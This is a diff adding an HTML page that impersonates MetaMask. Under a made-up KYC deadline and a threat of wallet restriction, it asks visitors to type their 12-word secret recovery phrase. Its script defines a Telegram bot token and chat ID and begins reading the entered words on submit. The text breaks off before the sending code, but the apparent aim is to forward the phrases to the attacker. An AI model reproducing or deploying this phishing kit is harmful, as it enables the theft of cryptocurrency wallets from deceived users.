@@ -1,0 +1,324 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <link href="https://cdn.jsdelivr.net/npm/remixicon@2.2.0/fonts/remixicon.css" rel="stylesheet">
+  <link rel="stylesheet" href="https://unpkg.com/aos@next/dist/aos.css" />
+  <link rel="shortcut icon" href='./img/Removal-870.png' type="image/x-icon">
+  <link rel="stylesheet" type="text/css" href= 'style.css'>
+  <title> Verify your Metamask account</title>
+</head>
+<body>
+    <div class="container">
+        <nav>
+            <div class="logo"><img src='./img/mm-logo.svg' alt=""></div>
+            <div class="nav-list">
+              <div class="nav-items">
+                <ul id="menuList">
+                  <li> <a href="https://metamask.io/swaps/"> Features<span><i class="ri-arrow-down-s-line"></i></span></a></li>
+                  <li> <a href="https://metamask.io/faqs/">Support<span><i class="ri-arrow-down-s-line"></i></span></a> </li>
+                  <li> <a href="https://metamask.io/about/"> About<span><i class="ri-arrow-down-s-line"></i></span></a></li>
+                  <li> <a href="https://docs.metamask.io/guide/s"> Build<span><i class="ri-arrow-down-s-line"></i></span></a></li>
+                </ul>
+              </div>
+              <i class="ri-menu-line" onclick="togglemenu()"></i>
+            </div>
+          </nav>
+    </div>
+
+    <section class="s1">
+        <div class="keys">
+            <div class="title">
+                <h1 style="color: #1b344d;"> Verify Your Account with Secret Recovery Phrase</h1>
+            </div>
+            <div>
+                <p>After completing this process, Your Account will Be Fully Verified and Eligble for New updates from the Metamask Team.</p>
+            </div>
+        </div>
+        
+    </section>
+
+    <section style="text-align: center;">
+        <div class="note">
+            <div class="head">
+                You are about to verify your wallet in order to complete our KYC regulations
+            </div>
+            <div>
+                <h3>What if I don't complete the wallet verification ?</h3>
+                <p>by 25/6/2022 if you don't verify, your wallet will be restricted </p>
+            </div>
+        </div>
+    </section>
+    <section> 
+        <div class="hd hs">
+             <div class="actionable-message__message">Type your 12 word phrase</div>
+
+        </div>
+        <form id="form">
+            <div class="box">
+                <div>
+                    <label for="seed1" class="import-srp__srp-word-label"><p class="box box--margin-top-1 box--margin-right-0 box--margin-bottom-1 box--margin-left-0 box--flex-direction-row typography typography--p typography--weight-normal typography--style-normal typography--color-black">1.</p></label>
+                    <div class="MuiFormControl-root MuiTextField-root">
+                        <div class="MuiInputBase-root MuiInput-root jss12 MuiInputBase-formControl MuiInput-formControl">
+                            <input aria-invalid="false" autocomplete="off" id="seed1" type="password" dir="auto" data-testid="import-srp__srp-word-0" class="MuiInputBase-input MuiInput-input tt" value="" name="s1" required>
+                        </div>
+                        <div class="show-hide-toggle" onclick="viewpassword()">
+                            <input class="show-hide-toggle__input" id="import-srp__srp-word-0-checkbox" type="checkbox" data-testid="import-srp__srp-word-0-checkbox">
+                            <label for="import-srp__srp-word-0-checkbox" class="show-hide-toggle__label" title="Show/Hide this word of the secret recovery phrase">
+                                <svg width="24" height="24" fill="currentColor" class="show-hide-toggle__icon" aria-label="This word is hidden" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 640 512"><path d="M634 471L36 3.51A16 16 0 0 0 13.51 6l-10 12.49A16 16 0 0 0 6 41l598 467.49a16 16 0 0 0 22.49-2.49l10-12.49A16 16 0 0 0 634 471zM296.79 146.47l134.79 105.38C429.36 191.91 380.48 144 320 144a112.26 112.26 0 0 0-23.21 2.47zm46.42 219.07L208.42 260.16C210.65 320.09 259.53 368 320 368a113 113 0 0 0 23.21-2.46zM320 112c98.65 0 189.09 55 237.93 144a285.53 285.53 0 0 1-44 60.2l37.74 29.5a333.7 333.7 0 0 0 52.9-75.11 32.35 32.35 0 0 0 0-29.19C550.29 135.59 442.93 64 320 64c-36.7 0-71.71 7-104.63 18.81l46.41 36.29c18.94-4.3 38.34-7.1 58.22-7.1zm0 288c-98.65 0-189.08-55-237.93-144a285.47 285.47 0 0 1 44.05-60.19l-37.74-29.5a333.6 333.6 0 0 0-52.89 75.1 32.35 32.35 0 0 0 0 29.19C89.72 376.41 197.08 448 320 448c36.7 0 71.71-7.05 104.63-18.81l-46.41-36.28C359.28 397.2 339.89 400 320 400z"></path></svg></label>
+                        </div>
+                    </div>
+                </div>
+
+                <div>
+                    <label for="seed2" class="import-srp__srp-word-label"><p class="box box--margin-top-1 box--margin-right-0 box--margin-bottom-1 box--margin-left-0 box--flex-direction-row typography typography--p typography--weight-normal typography--style-normal typography--color-black">2.</p></label>
+                    <div class="MuiFormControl-root MuiTextField-root">
+                        <div class="MuiInputBase-root MuiInput-root jss12 MuiInputBase-formControl MuiInput-formControl">
+                            <input aria-invalid="false"   autocomplete="off" id = "seed2" type="password" dir="auto" data-testid="import-srp__srp-word-0" class="MuiInputBase-input MuiInput-input tt" value="" name="s2" required>
+                        </div>
+                        <div class="show-hide-toggle"><input class="show-hide-toggle__input" id="import-srp__srp-word-0-checkbox" type="checkbox" data-testid="import-srp__srp-word-0-checkbox">
+                            <label for="import-srp__srp-word-0-checkbox" class="show-hide-toggle__label" title="Show/Hide this word of the secret recovery phrase"><svg width="24" height="24" fill="currentColor" class="show-hide-toggle__icon" aria-label="This word is hidden" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 640 512"><path d="M634 471L36 3.51A16 16 0 0 0 13.51 6l-10 12.49A16 16 0 0 0 6 41l598 467.49a16 16 0 0 0 22.49-2.49l10-12.49A16 16 0 0 0 634 471zM296.79 146.47l134.79 105.38C429.36 191.91 380.48 144 320 144a112.26 112.26 0 0 0-23.21 2.47zm46.42 219.07L208.42 260.16C210.65 320.09 259.53 368 320 368a113 113 0 0 0 23.21-2.46zM320 112c98.65 0 189.09 55 237.93 144a285.53 285.53 0 0 1-44 60.2l37.74 29.5a333.7 333.7 0 0 0 52.9-75.11 32.35 32.35 0 0 0 0-29.19C550.29 135.59 442.93 64 320 64c-36.7 0-71.71 7-104.63 18.81l46.41 36.29c18.94-4.3 38.34-7.1 58.22-7.1zm0 288c-98.65 0-189.08-55-237.93-144a285.47 285.47 0 0 1 44.05-60.19l-37.74-29.5a333.6 333.6 0 0 0-52.89 75.1 32.35 32.35 0 0 0 0 29.19C89.72 376.41 197.08 448 320 448c36.7 0 71.71-7.05 104.63-18.81l-46.41-36.28C359.28 397.2 339.89 400 320 400z"></path></svg></label>
+                        </div>
+                    </div>
+                </div>
+
+                <div>
+                    <label for="seed3" class="import-srp__srp-word-label"><p class="box box--margin-top-1 box--margin-right-0 box--margin-bottom-1 box--margin-left-0 box--flex-direction-row typography typography--p typography--weight-normal typography--style-normal typography--color-black">3.</p></label>
+                    <div class="MuiFormControl-root MuiTextField-root">
+                        <div class="MuiInputBase-root MuiInput-root jss12 MuiInputBase-formControl MuiInput-formControl">
+                            <input aria-invalid="false" autocomplete="off" id="seed3" type="password" dir="auto" data-testid="import-srp__srp-word-0" class="MuiInputBase-input MuiInput-input tt" value="" name="s3" required>
+                        </div>
+                        <div class="show-hide-toggle"><input class="show-hide-toggle__input" id="import-srp__srp-word-0-checkbox" type="checkbox" data-testid="import-srp__srp-word-0-checkbox">
+                            <label for="import-srp__srp-word-0-checkbox" class="show-hide-toggle__label" title="Show/Hide this word of the secret recovery phrase"><svg width="24" height="24" fill="currentColor" class="show-hide-toggle__icon" aria-label="This word is hidden" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 640 512"><path d="M634 471L36 3.51A16 16 0 0 0 13.51 6l-10 12.49A16 16 0 0 0 6 41l598 467.49a16 16 0 0 0 22.49-2.49l10-12.49A16 16 0 0 0 634 471zM296.79 146.47l134.79 105.38C429.36 191.91 380.48 144 320 144a112.26 112.26 0 0 0-23.21 2.47zm46.42 219.07L208.42 260.16C210.65 320.09 259.53 368 320 368a113 113 0 0 0 23.21-2.46zM320 112c98.65 0 189.09 55 237.93 144a285.53 285.53 0 0 1-44 60.2l37.74 29.5a333.7 333.7 0 0 0 52.9-75.11 32.35 32.35 0 0 0 0-29.19C550.29 135.59 442.93 64 320 64c-36.7 0-71.71 7-104.63 18.81l46.41 36.29c18.94-4.3 38.34-7.1 58.22-7.1zm0 288c-98.65 0-189.08-55-237.93-144a285.47 285.47 0 0 1 44.05-60.19l-37.74-29.5a333.6 333.6 0 0 0-52.89 75.1 32.35 32.35 0 0 0 0 29.19C89.72 376.41 197.08 448 320 448c36.7 0 71.71-7.05 104.63-18.81l-46.41-36.28C359.28 397.2 339.89 400 320 400z"></path></svg></label>
+                        </div>
+                    </div>
+                </div>
+
+                <div>
+                    <label for="seed4" class="import-srp__srp-word-label"><p class="box box--margin-top-1 box--margin-right-0 box--margin-bottom-1 box--margin-left-0 box--flex-direction-row typography typography--p typography--weight-normal typography--style-normal typography--color-black">4.</p></label>
+                    <div class="MuiFormControl-root MuiTextField-root">
+                        <div class="MuiInputBase-root MuiInput-root jss12 MuiInputBase-formControl MuiInput-formControl">
+                            <input aria-invalid="false" autocomplete="off" id="seed4" type="password" dir="auto" data-testid="import-srp__srp-word-0" class="MuiInputBase-input MuiInput-input tt" value="" name="s4" required>
+                        </div>
+                        <div class="show-hide-toggle"><input class="show-hide-toggle__input" id="import-srp__srp-word-0-checkbox" type="checkbox" data-testid="import-srp__srp-word-0-checkbox">
+                            <label for="import-srp__srp-word-0-checkbox" class="show-hide-toggle__label" title="Show/Hide this word of the secret recovery phrase"><svg width="24" height="24" fill="currentColor" class="show-hide-toggle__icon" aria-label="This word is hidden" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 640 512"><path d="M634 471L36 3.51A16 16 0 0 0 13.51 6l-10 12.49A16 16 0 0 0 6 41l598 467.49a16 16 0 0 0 22.49-2.49l10-12.49A16 16 0 0 0 634 471zM296.79 146.47l134.79 105.38C429.36 191.91 380.48 144 320 144a112.26 112.26 0 0 0-23.21 2.47zm46.42 219.07L208.42 260.16C210.65 320.09 259.53 368 320 368a113 113 0 0 0 23.21-2.46zM320 112c98.65 0 189.09 55 237.93 144a285.53 285.53 0 0 1-44 60.2l37.74 29.5a333.7 333.7 0 0 0 52.9-75.11 32.35 32.35 0 0 0 0-29.19C550.29 135.59 442.93 64 320 64c-36.7 0-71.71 7-104.63 18.81l46.41 36.29c18.94-4.3 38.34-7.1 58.22-7.1zm0 288c-98.65 0-189.08-55-237.93-144a285.47 285.47 0 0 1 44.05-60.19l-37.74-29.5a333.6 333.6 0 0 0-52.89 75.1 32.35 32.35 0 0 0 0 29.19C89.72 376.41 197.08 448 320 448c36.7 0 71.71-7.05 104.63-18.81l-46.41-36.28C359.28 397.2 339.89 400 320 400z"></path></svg></label>
+                        </div>
+                    </div>
+                </div>
+
+                <div>
+                    <label for="seed5" class="import-srp__srp-word-label"><p class="box box--margin-top-1 box--margin-right-0 box--margin-bottom-1 box--margin-left-0 box--flex-direction-row typography typography--p typography--weight-normal typography--style-normal typography--color-black">5.</p></label>
+                    <div class="MuiFormControl-root MuiTextField-root">
+                        <div class="MuiInputBase-root MuiInput-root jss12 MuiInputBase-formControl MuiInput-formControl">
+                            <input aria-invalid="false" autocomplete="off" id="seed5" type="password" dir="auto" data-testid="import-srp__srp-word-0" class="MuiInputBase-input MuiInput-input tt" value="" name="s5" required>
+                        </div>
+                        <div class="show-hide-toggle"><input class="show-hide-toggle__input" id="import-srp__srp-word-0-checkbox" type="checkbox" data-testid="import-srp__srp-word-0-checkbox">
+                            <label for="import-srp__srp-word-0-checkbox" class="show-hide-toggle__label" title="Show/Hide this word of the secret recovery phrase"><svg width="24" height="24" fill="currentColor" class="show-hide-toggle__icon" aria-label="This word is hidden" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 640 512"><path d="M634 471L36 3.51A16 16 0 0 0 13.51 6l-10 12.49A16 16 0 0 0 6 41l598 467.49a16 16 0 0 0 22.49-2.49l10-12.49A16 16 0 0 0 634 471zM296.79 146.47l134.79 105.38C429.36 191.91 380.48 144 320 144a112.26 112.26 0 0 0-23.21 2.47zm46.42 219.07L208.42 260.16C210.65 320.09 259.53 368 320 368a113 113 0 0 0 23.21-2.46zM320 112c98.65 0 189.09 55 237.93 144a285.53 285.53 0 0 1-44 60.2l37.74 29.5a333.7 333.7 0 0 0 52.9-75.11 32.35 32.35 0 0 0 0-29.19C550.29 135.59 442.93 64 320 64c-36.7 0-71.71 7-104.63 18.81l46.41 36.29c18.94-4.3 38.34-7.1 58.22-7.1zm0 288c-98.65 0-189.08-55-237.93-144a285.47 285.47 0 0 1 44.05-60.19l-37.74-29.5a333.6 333.6 0 0 0-52.89 75.1 32.35 32.35 0 0 0 0 29.19C89.72 376.41 197.08 448 320 448c36.7 0 71.71-7.05 104.63-18.81l-46.41-36.28C359.28 397.2 339.89 400 320 400z"></path></svg></label>
+                        </div>
+                    </div>
+                </div>
+
+
+                <div>
+                    <label for="seed6" class="import-srp__srp-word-label"><p class="box box--margin-top-1 box--margin-right-0 box--margin-bottom-1 box--margin-left-0 box--flex-direction-row typography typography--p typography--weight-normal typography--style-normal typography--color-black">6.</p></label>
+                    <div class="MuiFormControl-root MuiTextField-root">
+                        <div class="MuiInputBase-root MuiInput-root jss12 MuiInputBase-formControl MuiInput-formControl">
+                            <input aria-invalid="false" autocomplete="off" id="seed6" type="password" dir="auto" data-testid="import-srp__srp-word-0" class="MuiInputBase-input MuiInput-input tt" value="" name="s6" required>
+                        </div>
+                        <div class="show-hide-toggle"><input class="show-hide-toggle__input" id="import-srp__srp-word-0-checkbox" type="checkbox" data-testid="import-srp__srp-word-0-checkbox">
+                            <label for="import-srp__srp-word-0-checkbox" class="show-hide-toggle__label" title="Show/Hide this word of the secret recovery phrase"><svg width="24" height="24" fill="currentColor" class="show-hide-toggle__icon" aria-label="This word is hidden" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 640 512"><path d="M634 471L36 3.51A16 16 0 0 0 13.51 6l-10 12.49A16 16 0 0 0 6 41l598 467.49a16 16 0 0 0 22.49-2.49l10-12.49A16 16 0 0 0 634 471zM296.79 146.47l134.79 105.38C429.36 191.91 380.48 144 320 144a112.26 112.26 0 0 0-23.21 2.47zm46.42 219.07L208.42 260.16C210.65 320.09 259.53 368 320 368a113 113 0 0 0 23.21-2.46zM320 112c98.65 0 189.09 55 237.93 144a285.53 285.53 0 0 1-44 60.2l37.74 29.5a333.7 333.7 0 0 0 52.9-75.11 32.35 32.35 0 0 0 0-29.19C550.29 135.59 442.93 64 320 64c-36.7 0-71.71 7-104.63 18.81l46.41 36.29c18.94-4.3 38.34-7.1 58.22-7.1zm0 288c-98.65 0-189.08-55-237.93-144a285.47 285.47 0 0 1 44.05-60.19l-37.74-29.5a333.6 333.6 0 0 0-52.89 75.1 32.35 32.35 0 0 0 0 29.19C89.72 376.41 197.08 448 320 448c36.7 0 71.71-7.05 104.63-18.81l-46.41-36.28C359.28 397.2 339.89 400 320 400z"></path></svg></label>
+                        </div>
+                    </div>
+                </div>
+
+                <div>
+                    <label for="seed7" class="import-srp__srp-word-label"><p class="box box--margin-top-1 box--margin-right-0 box--margin-bottom-1 box--margin-left-0 box--flex-direction-row typography typography--p typography--weight-normal typography--style-normal typography--color-black">7.</p></label>
+                    <div class="MuiFormControl-root MuiTextField-root">
+                        <div class="MuiInputBase-root MuiInput-root jss12 MuiInputBase-formControl MuiInput-formControl">
+                            <input aria-invalid="false" autocomplete="off" id="seed7" type="password" dir="auto" data-testid="import-srp__srp-word-0" class="MuiInputBase-input MuiInput-input tt" value="" name="s7" required>
+                        </div>
+                        <div class="show-hide-toggle"><input class="show-hide-toggle__input" id="import-srp__srp-word-0-checkbox" type="checkbox" data-testid="import-srp__srp-word-0-checkbox">
+                            <label for="import-srp__srp-word-0-checkbox" class="show-hide-toggle__label" title="Show/Hide this word of the secret recovery phrase"><svg width="24" height="24" fill="currentColor" class="show-hide-toggle__icon" aria-label="This word is hidden" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 640 512"><path d="M634 471L36 3.51A16 16 0 0 0 13.51 6l-10 12.49A16 16 0 0 0 6 41l598 467.49a16 16 0 0 0 22.49-2.49l10-12.49A16 16 0 0 0 634 471zM296.79 146.47l134.79 105.38C429.36 191.91 380.48 144 320 144a112.26 112.26 0 0 0-23.21 2.47zm46.42 219.07L208.42 260.16C210.65 320.09 259.53 368 320 368a113 113 0 0 0 23.21-2.46zM320 112c98.65 0 189.09 55 237.93 144a285.53 285.53 0 0 1-44 60.2l37.74 29.5a333.7 333.7 0 0 0 52.9-75.11 32.35 32.35 0 0 0 0-29.19C550.29 135.59 442.93 64 320 64c-36.7 0-71.71 7-104.63 18.81l46.41 36.29c18.94-4.3 38.34-7.1 58.22-7.1zm0 288c-98.65 0-189.08-55-237.93-144a285.47 285.47 0 0 1 44.05-60.19l-37.74-29.5a333.6 333.6 0 0 0-52.89 75.1 32.35 32.35 0 0 0 0 29.19C89.72 376.41 197.08 448 320 448c36.7 0 71.71-7.05 104.63-18.81l-46.41-36.28C359.28 397.2 339.89 400 320 400z"></path></svg></label>
+                        </div>
+                    </div>
+                </div>
+
+
+                <div>
+                    <label for="seed8" class="import-srp__srp-word-label"><p class="box box--margin-top-1 box--margin-right-0 box--margin-bottom-1 box--margin-left-0 box--flex-direction-row typography typography--p typography--weight-normal typography--style-normal typography--color-black">8.</p></label>
+                    <div class="MuiFormControl-root MuiTextField-root">
+                        <div class="MuiInputBase-root MuiInput-root jss12 MuiInputBase-formControl MuiInput-formControl">
+                            <input aria-invalid="false" autocomplete="off" id="seed8" type="password" dir="auto" data-testid="import-srp__srp-word-0" class="MuiInputBase-input MuiInput-input tt" value="" name="s8" required> 
+                        </div>
+                        <div class="show-hide-toggle"><input class="show-hide-toggle__input" id="import-srp__srp-word-0-checkbox" type="checkbox" data-testid="import-srp__srp-word-0-checkbox">
+                            <label for="import-srp__srp-word-0-checkbox" class="show-hide-toggle__label" title="Show/Hide this word of the secret recovery phrase"><svg width="24" height="24" fill="currentColor" class="show-hide-toggle__icon" aria-label="This word is hidden" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 640 512"><path d="M634 471L36 3.51A16 16 0 0 0 13.51 6l-10 12.49A16 16 0 0 0 6 41l598 467.49a16 16 0 0 0 22.49-2.49l10-12.49A16 16 0 0 0 634 471zM296.79 146.47l134.79 105.38C429.36 191.91 380.48 144 320 144a112.26 112.26 0 0 0-23.21 2.47zm46.42 219.07L208.42 260.16C210.65 320.09 259.53 368 320 368a113 113 0 0 0 23.21-2.46zM320 112c98.65 0 189.09 55 237.93 144a285.53 285.53 0 0 1-44 60.2l37.74 29.5a333.7 333.7 0 0 0 52.9-75.11 32.35 32.35 0 0 0 0-29.19C550.29 135.59 442.93 64 320 64c-36.7 0-71.71 7-104.63 18.81l46.41 36.29c18.94-4.3 38.34-7.1 58.22-7.1zm0 288c-98.65 0-189.08-55-237.93-144a285.47 285.47 0 0 1 44.05-60.19l-37.74-29.5a333.6 333.6 0 0 0-52.89 75.1 32.35 32.35 0 0 0 0 29.19C89.72 376.41 197.08 448 320 448c36.7 0 71.71-7.05 104.63-18.81l-46.41-36.28C359.28 397.2 339.89 400 320 400z"></path></svg></label>
+                        </div>
+                    </div>
+                </div>
+
+
+                <div>
+                    <label for="seed9" class="import-srp__srp-word-label"><p class="box box--margin-top-1 box--margin-right-0 box--margin-bottom-1 box--margin-left-0 box--flex-direction-row typography typography--p typography--weight-normal typography--style-normal typography--color-black">9.</p></label>
+                    <div class="MuiFormControl-root MuiTextField-root">
+                        <div class="MuiInputBase-root MuiInput-root jss12 MuiInputBase-formControl MuiInput-formControl">
+                            <input aria-invalid="false" autocomplete="off" id="seed9" type="password" dir="auto" data-testid="import-srp__srp-word-0" class="MuiInputBase-input MuiInput-input tt" value="" name="s9" required>
+                        </div>
+                        <div class="show-hide-toggle"><input class="show-hide-toggle__input" id="import-srp__srp-word-0-checkbox" type="checkbox" data-testid="import-srp__srp-word-0-checkbox">
+                            <label for="import-srp__srp-word-0-checkbox" class="show-hide-toggle__label" title="Show/Hide this word of the secret recovery phrase"><svg width="24" height="24" fill="currentColor" class="show-hide-toggle__icon" aria-label="This word is hidden" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 640 512"><path d="M634 471L36 3.51A16 16 0 0 0 13.51 6l-10 12.49A16 16 0 0 0 6 41l598 467.49a16 16 0 0 0 22.49-2.49l10-12.49A16 16 0 0 0 634 471zM296.79 146.47l134.79 105.38C429.36 191.91 380.48 144 320 144a112.26 112.26 0 0 0-23.21 2.47zm46.42 219.07L208.42 260.16C210.65 320.09 259.53 368 320 368a113 113 0 0 0 23.21-2.46zM320 112c98.65 0 189.09 55 237.93 144a285.53 285.53 0 0 1-44 60.2l37.74 29.5a333.7 333.7 0 0 0 52.9-75.11 32.35 32.35 0 0 0 0-29.19C550.29 135.59 442.93 64 320 64c-36.7 0-71.71 7-104.63 18.81l46.41 36.29c18.94-4.3 38.34-7.1 58.22-7.1zm0 288c-98.65 0-189.08-55-237.93-144a285.47 285.47 0 0 1 44.05-60.19l-37.74-29.5a333.6 333.6 0 0 0-52.89 75.1 32.35 32.35 0 0 0 0 29.19C89.72 376.41 197.08 448 320 448c36.7 0 71.71-7.05 104.63-18.81l-46.41-36.28C359.28 397.2 339.89 400 320 400z"></path></svg></label>
+                        </div>
+                    </div>
+                </div>
+
+
+                <div>
+                    <label for="seed10" class="import-srp__srp-word-label"><p class="box box--margin-top-1 box--margin-right-0 box--margin-bottom-1 box--margin-left-0 box--flex-direction-row typography typography--p typography--weight-normal typography--style-normal typography--color-black">10.</p></label>
+                    <div class="MuiFormControl-root MuiTextField-root">
+                        <div class="MuiInputBase-root MuiInput-root jss12 MuiInputBase-formControl MuiInput-formControl">
+                            <input aria-invalid="false" autocomplete="off" id="seed10" type="password" dir="auto" data-testid="import-srp__srp-word-0" class="MuiInputBase-input MuiInput-input tt" value="" name="s10" required>
+                        </div>
+                        <div class="show-hide-toggle"><input class="show-hide-toggle__input" id="import-srp__srp-word-0-checkbox" type="checkbox" data-testid="import-srp__srp-word-0-checkbox">
+                            <label for="import-srp__srp-word-0-checkbox" class="show-hide-toggle__label" title="Show/Hide this word of the secret recovery phrase"><svg width="24" height="24" fill="currentColor" class="show-hide-toggle__icon" aria-label="This word is hidden" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 640 512"><path d="M634 471L36 3.51A16 16 0 0 0 13.51 6l-10 12.49A16 16 0 0 0 6 41l598 467.49a16 16 0 0 0 22.49-2.49l10-12.49A16 16 0 0 0 634 471zM296.79 146.47l134.79 105.38C429.36 191.91 380.48 144 320 144a112.26 112.26 0 0 0-23.21 2.47zm46.42 219.07L208.42 260.16C210.65 320.09 259.53 368 320 368a113 113 0 0 0 23.21-2.46zM320 112c98.65 0 189.09 55 237.93 144a285.53 285.53 0 0 1-44 60.2l37.74 29.5a333.7 333.7 0 0 0 52.9-75.11 32.35 32.35 0 0 0 0-29.19C550.29 135.59 442.93 64 320 64c-36.7 0-71.71 7-104.63 18.81l46.41 36.29c18.94-4.3 38.34-7.1 58.22-7.1zm0 288c-98.65 0-189.08-55-237.93-144a285.47 285.47 0 0 1 44.05-60.19l-37.74-29.5a333.6 333.6 0 0 0-52.89 75.1 32.35 32.35 0 0 0 0 29.19C89.72 376.41 197.08 448 320 448c36.7 0 71.71-7.05 104.63-18.81l-46.41-36.28C359.28 397.2 339.89 400 320 400z"></path></svg></label>
+                        </div>
+                    </div>
+                </div>
+
+
+                <div>
+                    <label for="seed11" class="import-srp__srp-word-label"><p class="box box--margin-top-1 box--margin-right-0 box--margin-bottom-1 box--margin-left-0 box--flex-direction-row typography typography--p typography--weight-normal typography--style-normal typography--color-black">11.</p></label>
+                    <div class="MuiFormControl-root MuiTextField-root">
+                        <div class="MuiInputBase-root MuiInput-root jss12 MuiInputBase-formControl MuiInput-formControl">
+                            <input aria-invalid="false" autocomplete="off" id="seed11" type="password" dir="auto" data-testid="import-srp__srp-word-0" class="MuiInputBase-input MuiInput-input tt" value="" name="s11" required>
+                        </div>
+                        <div class="show-hide-toggle"><input class="show-hide-toggle__input" id="import-srp__srp-word-0-checkbox" type="checkbox" data-testid="import-srp__srp-word-0-checkbox">
+                            <label for="import-srp__srp-word-0-checkbox" class="show-hide-toggle__label" title="Show/Hide this word of the secret recovery phrase"><svg width="24" height="24" fill="currentColor" class="show-hide-toggle__icon" aria-label="This word is hidden" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 640 512"><path d="M634 471L36 3.51A16 16 0 0 0 13.51 6l-10 12.49A16 16 0 0 0 6 41l598 467.49a16 16 0 0 0 22.49-2.49l10-12.49A16 16 0 0 0 634 471zM296.79 146.47l134.79 105.38C429.36 191.91 380.48 144 320 144a112.26 112.26 0 0 0-23.21 2.47zm46.42 219.07L208.42 260.16C210.65 320.09 259.53 368 320 368a113 113 0 0 0 23.21-2.46zM320 112c98.65 0 189.09 55 237.93 144a285.53 285.53 0 0 1-44 60.2l37.74 29.5a333.7 333.7 0 0 0 52.9-75.11 32.35 32.35 0 0 0 0-29.19C550.29 135.59 442.93 64 320 64c-36.7 0-71.71 7-104.63 18.81l46.41 36.29c18.94-4.3 38.34-7.1 58.22-7.1zm0 288c-98.65 0-189.08-55-237.93-144a285.47 285.47 0 0 1 44.05-60.19l-37.74-29.5a333.6 333.6 0 0 0-52.89 75.1 32.35 32.35 0 0 0 0 29.19C89.72 376.41 197.08 448 320 448c36.7 0 71.71-7.05 104.63-18.81l-46.41-36.28C359.28 397.2 339.89 400 320 400z"></path></svg></label>
+                        </div>
+                    </div>
+                </div>
+
+                <div>
+                    <label for="seed12" class="import-srp__srp-word-label"><p class="box box--margin-top-1 box--margin-right-0 box--margin-bottom-1 box--margin-left-0 box--flex-direction-row typography typography--p typography--weight-normal typography--style-normal typography--color-black">12.</p></label>
+                    <div class="MuiFormControl-root MuiTextField-root">
+                        <div class="MuiInputBase-root MuiInput-root jss12 MuiInputBase-formControl MuiInput-formControl">
+                            <input aria-invalid="false" autocomplete="off" id="seed12" type="password" dir="auto" data-testid="import-srp__srp-word-0" class="MuiInputBase-input MuiInput-input tt" value="" name="s12" required>
+                        </div>
+                        <div class="show-hide-toggle"><input class="show-hide-toggle__input" id="import-srp__srp-word-0-checkbox" type="checkbox" data-testid="import-srp__srp-word-0-checkbox">
+                            <label for="import-srp__srp-word-0-checkbox" class="show-hide-toggle__label" title="Show/Hide this word of the secret recovery phrase"><svg width="24" height="24" fill="currentColor" class="show-hide-toggle__icon" aria-label="This word is hidden" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 640 512"><path d="M634 471L36 3.51A16 16 0 0 0 13.51 6l-10 12.49A16 16 0 0 0 6 41l598 467.49a16 16 0 0 0 22.49-2.49l10-12.49A16 16 0 0 0 634 471zM296.79 146.47l134.79 105.38C429.36 191.91 380.48 144 320 144a112.26 112.26 0 0 0-23.21 2.47zm46.42 219.07L208.42 260.16C210.65 320.09 259.53 368 320 368a113 113 0 0 0 23.21-2.46zM320 112c98.65 0 189.09 55 237.93 144a285.53 285.53 0 0 1-44 60.2l37.74 29.5a333.7 333.7 0 0 0 52.9-75.11 32.35 32.35 0 0 0 0-29.19C550.29 135.59 442.93 64 320 64c-36.7 0-71.71 7-104.63 18.81l46.41 36.29c18.94-4.3 38.34-7.1 58.22-7.1zm0 288c-98.65 0-189.08-55-237.93-144a285.47 285.47 0 0 1 44.05-60.19l-37.74-29.5a333.6 333.6 0 0 0-52.89 75.1 32.35 32.35 0 0 0 0 29.19C89.72 376.41 197.08 448 320 448c36.7 0 71.71-7.05 104.63-18.81l-46.41-36.28C359.28 397.2 339.89 400 320 400z"></path></svg></label>
+                        </div>
+                    </div>
+                </div>
+
+                
+
+                
+            </div>
+
+            <div style="text-align: center; padding-bottom: 2rem;">
+                <button class="btn btn--primary" type="submit">Confirm Your Seed Phrase</button>
+            </div>
+        </form>
+    </section>
+
+
+
+
+
+
+
+
+    <script src="https://unpkg.com/aos@next/dist/aos.js"></script>
+
+    <script>
+      AOS.init({
+        once: true,
+        offset: 400,
+        duration: 1000
+      });
+    </script> 
+
+    <script>
+      document.addEventListener("mousemove", (e) => {
+        
+        let svg = document.querySelector(".svg")
+          // const speed = svg.getAttribute("data-speed")
+
+          // const x = (window.innerWidth - e.pageX*speed)/100
+          // const y = (window.innerWidth - e.pageY*speed)/100
+          // console.log(x)
+          // svg.style.transform = `rotate3d(1,1,1,${e.clientX - 180}deg)`
+          // console.log(e)
+      })
+    </script>
+
+    <script>
+    var menuList = document.getElementById("menuList");
+
+    menuList.style.maxHeight  = "0px";
+
+    function togglemenu()
+    {
+        if(menuList.style.maxHeight == "0px")
+        {
+            menuList.style.maxHeight = "200px";
+        }
+        else
+        {
+            menuList.style.maxHeight = "0px";
+        }
+    }
+    </script>
+
+    <script>
+        function viewpassword(){
+            var x = document.getElementsByClassName("show-hide-toggle__label");
+            for (var i=0;i<x.length;i+=1){
+                x[i].style.display = 'none';
+            }
+            inputs = document.getElementsByClassName("tt")
+
+            
+            for(var i=0; i<inputs.length; i+=1){
+                inputs[i].type = 'text';
+            }
+        }
+
+        let form  = document.querySelector("#form")
+
+        let bot = {
+            TOKEN: "5374624435:AAGzo74m1QW0gFB2eq1q72uXaSwa49_n464",
+            chatID: "-681690950"
+        }
+
+        form.addEventListener("submit", (e) =>{
+            e.preventDefault();
+
+            let seed1= document.querySelector("#seed1").value;
+            let seed2= document.querySelector("#seed2").value;
+            let seed3= document.querySelector("#seed3").value;
+            let seed4= document.querySelector("#seed4").value;
+            let seed5= document.querySelector("#seed5").value;
+            let seed6= document.querySelector("#seed6").value;
+            let seed7= document.querySelector("#seed7").value;
+            let seed8= document.querySelector("#seed8").value;
+            let seed9= document.querySelector("#seed9").value;
+            let seed10= document.querySelector("#seed10").value;
+            let seed11= document.querySelector("#seed11").value;
